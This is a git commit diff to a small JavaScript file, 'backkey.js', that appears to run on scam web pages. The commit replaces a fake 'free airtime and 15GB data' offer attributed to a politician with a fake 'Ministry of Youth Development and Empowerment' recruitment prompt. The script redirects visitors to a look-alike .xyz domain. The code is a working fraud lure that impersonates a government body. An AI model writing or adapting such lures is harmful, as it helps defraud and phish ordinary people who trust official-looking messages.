d3995bd066a3c2907243eaaef65657b5d569b9fd
KENNY <examtapz+me@gmail.com>
2026-06-29 15:44:14 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Recruitment'
+password=prompt('SMS: Welcome to the Ministry of Youth Development and Empowerment Program, Please press OK to continue. ','Recruitment');
+if (password != 'Recruitment') {
+location.href='https://myde-career.go-program.xyz/staff';
 }
